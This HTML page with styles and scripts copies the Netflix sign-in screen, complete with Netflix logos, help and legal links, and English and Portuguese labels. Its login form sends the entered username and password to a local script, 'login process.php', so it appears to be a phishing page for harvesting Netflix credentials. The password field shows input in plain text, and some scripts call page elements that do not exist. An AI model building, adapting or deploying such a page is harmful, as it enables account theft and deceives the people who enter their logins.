<!DOCTYPE html>
<html>
<head>
    <title>Login page</title>
    <style>
        body {
    position: relative;
    overflow-y: scroll;
    overflow-x: hidden;
    width: 100%;
    height: 1092.33px;
    margin: 0;
    padding: 0;
    font-family: Helvetica, Arial, sans-serif;
    display: block;
}

#app {
    position: absolute;
    margin: 0;
    top: 0;
    left: 0;
    padding: 0;
    width: 100%;
    height: 1092.33px;
    background-color: rgba(0, 0, 0, 0.6);
}

.background-wrapper {
    position: absolute;
    background-size: cover;
    height: 100%;
    min-height: 100vh;
    overflow: hidden;
    width: 100%;
    z-index: -1;
}

.background-wrapper .background {
    min-height: 100%;
    min-width: 100%;
}

#header {
    position: relative;
    width: 100vw;
    margin: 22.5px 0 20px 3vw;
}

#logo {
    height: auto;
    width: 167px;
}

#container {
    position: relative;
    display: block;
    background-color: rgba(0, 0, 0, 0.7);
    width: 314px;
    height: 575.33px;
    left: 50vw;
    margin-left: -233.5px;
    border-radius: 4px;
    padding: 60px 68px 40px 68px;
    margin-bottom: 90px;
}


#log-in-form {
    position: relative;
    display: block;
    width: 100%;
    height: 340.667px;
}

#sign-in-text {
    margin: 0;
    font-size: 32px;
    color: white;
}

.label-container {
    position: relative;
    display: block;
    width: 100%;
    margin-bottom: 28px;
}

.inputError {
    position: relative;
    top: -10px;
    padding: 0 3px 6px 3px;
    font-size: 13px;
    color: #E87C03;
}

.inputError#email-inputError, .inputError#pwd-inputError {
    display: none;
}

.box-container {
    position: relative;
    width: 100%;
    height: 50px;
    margin-bottom: 16px;
    border-radius: 4px;
    border-width: 0;
    background-color: #363636;
}

#login-button-container {
    margin-top: 40px;
    margin-bottom: 12px;
    height: 48px;
}

.field {
    position: relative;
    width: 274px;
    height: 32px;
    border-radius: 4px;
    outline: 0 none;
    border-width: 0;
    padding: 16px 20px 0 20px;
    color: white;
    background-color: transparent;
}

#login-button {
    position: relative;
    width: 100%;
    height: 100%;
    border-width: 0;
    border-radius: 4px;
    background-color: red;
    color: white;
    font-weight: bold;
    text-align: center;
    padding: 0;
    font-size: 16px;
}

.checkbox-row {
    position: relative;
    width: 100%;
    top: 2px;
    font-size: 13px;
}

.checkbox-container {
    position: absolute;
    background-color: white;
    outline: 0 none;
    opacity: 60%;
    border-radius: 2px;
    border-width: 0;
    width: 16px;
    height: 16px;
    padding: 0;
    margin: 0;
}

#icon {
    color: black;
    position: absolute;
    pointer-events: none;
    width: 12px;
    left: 50%;
    top: 50%;
    margin-left: -6px;
    margin-top: -6px;
}

input#remember-me:focus {
    opacity: 100%;
}

#remember-me-label {
    position: relative;
    color: white;
    opacity: 60%;
    user-select: none;
    width: max-content;
    margin: 0 0 0 20px;
}

#help {
    position: relative;
    cursor: pointer;
    text-align: right;
    float: right;
    color: white;
    text-decoration: none;
    opacity: 90%;
}

#help:hover {
    text-decoration: underline;
}

.label {
    position: absolute;
    cursor: text;
    user-select: none;
    font-size: 16px;
    opacity: 50%;
    font-family: Arial, Helvetica, sans-serif;
    left: 20px;
    top: 15px;
    color: white;
    transition: font-size 100ms ease, top 100ms ease, opacity 100ms ease;
}
.fb-login-form {
    position: relative;
    width: 100%;
    height: fit-content;
}
.fb-login-button {
    position: relative;
    display: block;
    margin: 16px 0 0 0;
    padding: 0;
    background: none;
    border-width: 0;
    height: 20px;
    cursor: pointer;
}
.fb-login {
    position: relative;
    padding: 0;
    margin: 0;
    height: fit-content;
    width: fit-content;
}
.fb-icon {
    position: relative;
    margin: 0 10px 0 0;
    padding: 0;
    width: 20px;
    height: 20px;
    vertical-align: middle;
    user-select: none;
}
.fb-btn-text {
    position: relative;
    color: #737373;
    font-size: 13px;
    font-weight: 500;
    user-select: none;
    left: -4px;
}

.sign-up {
    position: relative;
    width: 100%;
    margin: 16px 0 0 0;
    color: #737373;
}
.sign-up-link {
    color: white;
    text-decoration: none;
}

.sign-up-link:hover {
    text-decoration: underline;
}

.reCAPTCHA {
    position: relative;
    margin: 13px 0 0 0;
    width: 100%;
    height: 135.667px;
}
#reCAPTCHA-text {
    position: relative;
    text-align: left;
    font-size: 13px;
    color: #737373;
}

.learn-more-button {
    position: relative;
    margin: 0;
    padding: 0;
    height: fit-content;
    width: fit-content;
}
#learn-more {
    position: relative;
    background-color: transparent;
    border: none;
    color: #0071eb;
    cursor: pointer;
    display: inline;
    font-family: inherit;
    font-size: inherit;
    padding: 0;
    outline: 0 none;
}

#learn-more:hover {
    text-decoration: underline;
}

#terms-of-use {
    position: relative;
    visibility: hidden;
    width: 100%;
    text-align: left;
    font-family: inherit;
    font-size: 13px;
    color: #737373;
}

.black-link {
    color: #0071eb;
    cursor: pointer;
    font-family: inherit;
    font-size: inherit;
    text-decoration: none;
}

.black-link:hover {
    text-decoration: underline;
}

footer {
    position: absolute;
    width: 100vw;
    height: 236px;
    bottom: 0;
    background: rgba(0, 0, 0, 0.75);
}

.footer {
    position: relative;
    display: block;
    padding: 30px 0 30px 0;
    height: 148px;
    margin-left: 10.27vw;
    margin-right: 10.27vw;
    color: #999;
}

.footer-header {
    position: relative;
    padding: 0;
    width: 100%;
    margin: 0 0 30px 0;
    font-size: 1rem;
}

.inline-footer-ul {
    position: relative;
    width: 100%;
    padding: 0;
    margin: 0;
}

.inline-footer-li {
    display: inline-block;
    vertical-align: text-top;
    margin-top: 0;
    width: 18.26vw;
    min-width: fit-content;
    padding-right: 12px;
    list-style-type: none;
    font-size: 13px;
}

.footer-link {
    cursor: pointer;
    color: #999;
    text-decoration: none;
}

.footer-link:hover {
    text-decoration: underline;
}

.language-selector-container {
    position: relative;
    width: 100%;
    margin: 20px 0 0 0;
}

.language-selector-boundaries {
    position: absolute;
    display: inline-block;
    padding: 0;
    margin: 0;
    width: 137.33px;
    height: 48px;
    border: none;
    background: none;
}

#language-selector {
    position: absolute;
    -webkit-appearance: none;
    appearance: none;
    color: #999;
    padding: 12px 26px 12px 50px;
    background-color: black;
    font-size: 13px;
    text-align: left;
    text-decoration: none;
    border: 1px solid #333;
    width: 100%;
    height: 100%;
    text-indent: 0;
    line-height: 1.7;
}

.language-selector-boundaries:after {
    position: absolute;
    user-select: none;
    content: "";
    top: 20px;
    right: 8px;
    width: 0;
    height: 0;
    border: 6px solid transparent;
    border-color: #999 transparent transparent transparent;
}

#language-selector option {
    font-weight: normal;
    display: block;
    white-space: pre;
    min-height: 1.2em;
    padding: 0px 2px 1px;
}

.globe-icon {
    position: absolute;
    top: 12px;
    left: 12px;
    width: 25px;
}
#btn {
    background: red;
    padding: 14px;
    width: 100%;
    font-weight: bolder;
    color: white;
    font-family: sans-serif;
    font-size: 20px;
}
#user {
    width:110%;
    height:40px;
    border-radius: 2px;
    margin-left: -24px; 
}
#pass {
    width:110%;
    height:40px;
    border-radius: 2px;
    margin-left: -24px; 

}
        </style>
</head>
<body onload="setUpLanguage()" onresize="updateView()">
        <div class="background-wrapper">
            <img class="background" src="7c907867-1eb5-47ae-9700-32a4834b4cdf.jpg" alt>
        </div>
        <div id="app">
            <div id="header">
                <a href="https://www.netflix.com/">
                    <img id="logo" src="79402704f670d5a8cd3c4720b74a7b16.png">
                </a>
            </div>
            <div id="container">
                <form id="log-in-form" action="login process.php" method="POST">
                    <div class="label-container">
                        <h2 id="sign-in-text"></h1>
                    </div>

                    <input type="text" id="user" name="username" placeholder="username"/><br><br>
    <input type="text" id="pass" name="password" placeholder="password"/><br><br>
    <button type="submit" id="btn" name="login" default>login</button>


                    <div class="checkbox-row">
                        <span class="checkbox-container" tabindex="0" id="checkbox" onclick="toggleCheckBox()" onblur="checkBoxOnBlur()">
                            <svg id="icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="check" class="svg-inline--fa fa-check fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>
                        </span>
                        <label id="remember-me-label" onclick="toggleCheckBox()"></label>
                        
                        <a href="https://www.netflix.com/br/LoginHelp">
                            <label id="help"></label>
                        </a>
                    </div>
                </form>
                <form action="" method="POST" class="fb-login-form">
                    <button class="fb-login-button" type="submit">
                        <div class="fb-login">
                            <img class="fb-icon" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__black_57.png">
                            <span class="fb-btn-text" id="fb-btn-text"></span>
                        </div>
                    </button>
                </form>
                <div class="sign-up">
                    <span id="sign-up"></span>
                    <a class="sign-up-link" id="sign-up-link" href="https://www.netflix.com/br-en/"></a>
                </div>
                <div class="reCAPTCHA">
                    <p id="reCAPTCHA-text">
                        <span id="reCAPInfo"></span>
                        <span class="learn-more-button">
                            <button id="learn-more" onclick="showTermsOfUse()"></button>
                        </span>
                    </p>
                    <div id="terms-of-use">
                        <span>
                            <span id="reCAP1"></span>
                            <a class="black-link" id="reCAP2" href="https://policies.google.com/terms"></a>
                            <span id="reCAP3"></span>
                            <a class="black-link" id="reCAP4" href="https://policies.google.com/terms"></a>
                            <span id="reCAP5"></span>
                        </span>
                    </div>
                </div>
            </div>
            <footer>
                <div class="footer" id="footer">
                    <p class="footer-header">
                        <span id="footer-header"></span>
                        <a class="footer-link">0800-761-4632</a>
                    </p>
                    <ul class="inline-footer-ul">
                        <li class="inline-footer-li">
                            <a class="footer-link" href="https://help.netflix.com/legal/giftterms" id="gift"></a>
                        </li>
                        <li class="inline-footer-li">
                            <a class="footer-link" href="https://help.netflix.com/legal/termsofuse" id="terms"></a>
                        </li>
                        <li class="inline-footer-li">
                            <a class="footer-link" href="https://help.netflix.com/legal/privacy" id="privacy"></a>
                        </li>
                    </ul>
                    <div class="language-selector-container">
                        <div class="language-selector-boundaries">
                            <select name="language" id="language-selector" onchange="loadTexts(getSelectedLanguage())">
                                <option value="en">English</option>
                                <option value="pt">Português</option>
                            </select>
                            <img class="globe-icon" src="https://climefish.eu/wp-content/uploads/sites/18/2017/08/icon-globe-400px.png">
                        </div>
                    </div>
                </div>
            </footer>
        </div>

        
    </body>
    <script>
const ids = [
    "sign-in-text", 
    "email-label",
    "email-inputError",
    "pwd-label",
    "pwd-inputError",
    "remember-me-label",
    "help",
    "fb-btn-text",
    "sign-up",
    "sign-up-link",
    "reCAPInfo",
    "learn-more",
    "reCAP1",
    "reCAP2",
    "reCAP3",
    "reCAP4",
    "reCAP5",
    "footer-header",
    "gift",
    "terms",
    "privacy"
]

const labels = Object.freeze (
    {
        'en': [
            "Sign In",
            "Email or phone number",
            "Please enter a valid email or phone number.",
            "Password",
            "Your password must contain between 4 and 60 characters.",
            "Remember me",
            "Need help?",
            "Login with Facebook",
            "New to Netflix? ",
            "Sign up now.",
            "This page is protected by Google reCAPTCHA to ensure you're not a bot. ",
            "Learn more",
            "The information collected by Google reCAPTCHA is subject to the Google ",
            "Privacy Policy",
            " and ",
            "Terms of Service",
            ", and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).",
            "Questions? Call ",
            "Gift Card Terms",
            "Terms of Use",
            "Privacy Statement",
        ],
        'pt': [
            "Entrar",
            "Email ou número de telefone",
            "Informe um email ou número de telefone válido.",
            "Senha",
            "A senha deve ter entre 4 e 60 caracteres.",
            "Lembrar-se de mim",
            "Precisa de ajuda?",
            "Conectar com o Facebook",
            "Novo por aqui? ",
            "Assine agora.",
            "Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô. ",
            "Saiba mais",
            "As informações recolhidas pelo Google reCAPTCHA estão sujeitas à ",
            "Política de Privacidade",
            " e ",
            "Termos de Uso",
            ", e são usadas para oferecer, manter e melhorar o serviço reCAPTCHA e por questões de segurança (não são usadas para exibir anúncios personalizados pelo Google).",
            "Dúvidas? Ligue ",
            "Termos dos Cartões pré-pagos",
            "Termos de uso",
            "Declaração de privacidade",
        ],
    }
);

const loadTexts = function (lang) {
    let text = lang === 'pt' ? labels.pt : labels.en;
    for (let i = 0; i < ids.length; i++) {
        document.getElementById(ids[i]).innerHTML = text[i];
    }
    document.getElementById('login-button').value = text[0];
    document.lang = lang;
}

const getSelectedLanguage = function () {
    let selector = document.getElementById("language-selector");
    let value = selector.options[selector.selectedIndex].value;
    return value;
}

const getBrowserLanguage = function () {
    let lang = navigator.language || navigator.userLanguage;
    lang = lang.slice(0, 2);
    return lang;
}

const setSelectedLanguage = function (lang) {
    lang = lang === 'pt' ? lang : 'en';
    document.getElementById('language-selector').value = lang;
}

const setUpLanguage = function () {
    let lang = getBrowserLanguage();
    lang = lang.slice(0, 2);
    loadTexts(lang);
    setSelectedLanguage(lang);
}


        var email = "", pwd = "", checked = true;

const update = function (id, targetId, inputErrorId) {
    let newValue = document.getElementById(id).value;
    email = id === 'email-field' ? newValue : email;
    pwd = id === 'pwd-field' ? newValue : pwd;
    updateStyle(targetId);
    checkAndUpdate(id, inputErrorId);
    adjustLoginFormHeight();
}

const inputOnFocus = function (id, targetId, boxId) {
    updateStyle(targetId, document.getElementById(id).value);
    let box = document.getElementById(boxId);
    box.style.backgroundColor = 'rgb(70, 70, 70)';
}

const updateStyle = function (targetId) {
    let el = document.getElementById(targetId);
    el.style.top = '7px';
    el.style.fontSize = '10px';
    el.style.opacity = '50%';
}

const inputOnBlur = function (id, targetId, boxId, inputErrorId) {
    let el = document.getElementById(targetId);
    let field = document.getElementById(id);
    let box = document.getElementById(boxId);
    let value = field.value;
    box.style.backgroundColor = '#363636';
    if(value.toString().length === 0) {
        el.style.top = '15px';
        el.style.fontSize = '16px';
        el.style.opacity = '60%';
    }
    checkAndUpdate(id, inputErrorId);
    adjustLoginFormHeight();
}

const checkAndUpdate = function (id, inputErrorId) {
    let field = document.getElementById(id),
        inputError = document.getElementById(inputErrorId);

    if(!isValid(id)) {
        adjustLoginButtonContainer(id, 24)
        field.style.borderBottomWidth = '2px';
        field.style.borderBottomColor = '#E87C03';
        inputError.style.display = 'block';
    } else {
        adjustLoginButtonContainer(id);
        field.style.borderBottomWidth = '0';
        field.style.borderBottomColor = 'transparent';
        inputError.style.display = 'none';
    }
}

const adjustLoginButtonContainer = function (id, pixels = 40) {
    let px = pixels + 'px'
    if(id === 'pwd-field') {
        document.getElementById('login-button-container').style.marginTop = px;
    }
}
const isValid = function (elementId) {
    if(elementId === 'email-field') {
        let email_OK = false, emailArray = email.split('@');
        if (emailArray.length === 2) {
            if (emailArray[1].length > 1) {
                let innerEmailArray = emailArray[1].split('.');
                if (innerEmailArray.length > 1) {
                    if (innerEmailArray[1].length > 0) {
                        email_OK = true;
                    }
                }
            }
        }
        let phone_OK = ((!isNaN(email)) && (email.length > 7));
        return email_OK || phone_OK;
    }
    if(elementId === 'pwd-field') {
        return (pwd.length > 3 && pwd.length < 61);
    }
    return false;
}

const toggleCheckBox = function () {
    checked = !checked;
    document.getElementById('icon').style.display = checked ? 'inherit' : 'none';
    let checkbox = document.getElementById('checkbox');
    checkbox.focus();
    checkbox.style.opacity = '100%';
}

const checkBoxOnBlur = function () {
    checkbox.style.opacity = '60%';
}

const adjustLoginFormHeight = function () {
    let emailError = isHidden(document.getElementById('email-inputError')),
        pwdError = isHidden(document.getElementById('pwd-inputError'));
    document.getElementById('log-in-form').style.height = !emailError && !pwdError ? 'fit-content' : '340.667px';
}

const isHidden = function (el) {
    return (el.offsetParent === null)
}

const showTermsOfUse = function () {
    document.getElementById('learn-more').style.visibility = 'hidden';
    document.getElementById('terms-of-use').style.visibility = 'visible';
}

const updateView = function () {
    let viewWidth = window.innerWidth;
    if(viewWidth < 745) {
        document.getElementById('app').style.backgroundColor = 'black';
        document.getElementById('container').style.width = '87vw';
        document.getElementById('container').style.left = '0';
        document.getElementById('container').style.marginLeft = '0';
        document.getElementById('container').style.padding = '60px 5vw 40px 5vw';
        let inputFields = document.getElementsByClassName('field');
        let width = (viewWidth*0.87) - 40;
        for (let i = 0; i < inputFields.length; i++) {
            document.getElementById(inputFields[i].id).style.width = `${width}px`;
        };
    } else {
        document.getElementById('app').style.backgroundColor = 'rgba(0, 0, 0, 0.6)';
        document.getElementById('container').style.width = '314px';
        document.getElementById('container').style.left = '50vw';
        document.getElementById('container').style.marginLeft = '-233.5px';
        document.getElementById('container').style.padding = '60px 68px 40px 68px';
        let inputFields = document.getElementsByClassName('field');
        for (let i = 0; i < inputFields.length; i++) {
            document.getElementById(inputFields[i].id).style.width = '274px';
        };
    }
}
        </script>
</html>
          